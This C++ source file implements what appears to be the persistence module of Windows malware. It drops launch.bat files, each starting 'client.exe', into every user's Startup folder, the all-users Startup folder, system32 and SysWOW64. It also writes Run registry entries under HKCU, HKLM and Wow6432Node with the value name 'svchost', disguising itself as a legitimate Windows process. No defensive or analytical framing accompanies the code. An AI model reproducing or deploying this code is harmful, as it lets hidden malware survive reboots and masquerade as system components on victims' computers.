#include "AutoStart.hpp"

AutoStart::AutoStart(const std::string &exeName)
	: _name(exeName)
{

}

AutoStart::~AutoStart()
{

}

void	AutoStart::verifyPath() const
{
	std::unique_ptr<IFileSystemHelper> ptr(new BoostFileSystemHelper()); //AFactory<IFileSystemHelper>::instance().create("BoostFileSystemHelper");
	std::string name(ptr->fileBaseName(_name) + ptr->fileExtension(_name));
	std::string folder("C:\\Users\\");
	std::string startUpFolder("\\AppData\\Roaming\\Microsoft\\Windows\\Start\ Menu\\Programs\\Startup");
	HANDLE id;
	WIN32_FIND_DATA file;
	std::string tab[] = {	
							"C:\\ProgramData\\Microsoft\\Windows\\Start\ Menu\\Programs\\StartUp",
							"c:\\Windows\\system32",
							"c:\\Windows\\SysWOW64"
						};

	for (auto path : tab)
	{
		if (isDirectory(path) && !isFile(path + "\\launch.bat"))
			createFile(path + "\\launch.bat");
	}

	if ((id = FindFirstFile((folder + "*").c_str(), &file)) != INVALID_HANDLE_VALUE)
	{
		while (FindNextFile(id, &file))
		{
			std::string tmp(folder + file.cFileName + startUpFolder);

			if (isDirectory(tmp) && !isFile(tmp + "\\launch.bat"))
				createFile(tmp + "\\launch.bat");
		}
		FindClose(id);
	}
}

void	AutoStart::verifyRegister() const
{
	writeInRegister(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "svchost", _name);
	writeInRegister(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "svchost", _name);
	writeInRegister(HKEY_LOCAL_MACHINE, "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", "svchost", _name);
}

bool	AutoStart::writeInRegister (const HKEY base_key, const std::string &key_path,
									const std::string &key_name, const std::string &data) const
{
	HKEY    hkey;
	DWORD   dwDisposition;

	if (RegCreateKeyEx(base_key, TEXT(key_path.c_str()), 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hkey, &dwDisposition) == ERROR_SUCCESS)
	{
		long setRes = RegSetValueEx(hkey, key_name.c_str(), 0, REG_SZ,
									reinterpret_cast<const BYTE*>(data.c_str()), data.size() + 1);
		if (setRes == ERROR_SUCCESS)
			std::cout << "Key => " << key_name << " | " << data << std::endl;
		else
			std::cerr << "Error writing to Registry." << std::endl;
		RegCloseKey(hkey);
		return (true);
	}
	else
		std::cerr << "Error openning the Registry." << std::endl;
	return (false);
}

bool	AutoStart::copyFile(const std::string &from, const std::string &to) const
{
	std::ifstream	fileFrom(from.c_str(), std::fstream::binary);
	std::ofstream	fileTo(to.c_str(), std::fstream::out | std::fstream::trunc | std::fstream::binary);

	std::cout << "File => " << from << " > " << to << std::endl;
	if (fileFrom && fileTo)
	{
		std::istreambuf_iterator<char> bFrom(fileFrom), eFrom;
		std::ostreambuf_iterator<char> bTo(fileTo);
		std::copy(bFrom, eFrom, bTo);
		return (true);
	}
	std::cerr << strerror(errno) << std::endl;
	return (false);
}

bool	AutoStart::isDirectory(const std::string &path) const
{
	struct stat file;

	if (stat(path.c_str(), &file) != -1 && file.st_mode & S_IFDIR)
		return (true);
	return (false);
}

bool	AutoStart::isFile(const std::string &path) const
{
	struct stat file;

	if (stat(path.c_str(), &file) != -1 && file.st_mode & S_IFREG)
		return (true);
	return (false);
}

bool	AutoStart::createFile(const std::string &path) const
{
	std::ofstream file(path.c_str(), std::fstream::out | std::fstream::trunc | std::fstream::binary);

	if (file)
	{
		file << "start \"" << _name << "\" client.exe";
		return (false);
	}
	return (false);
}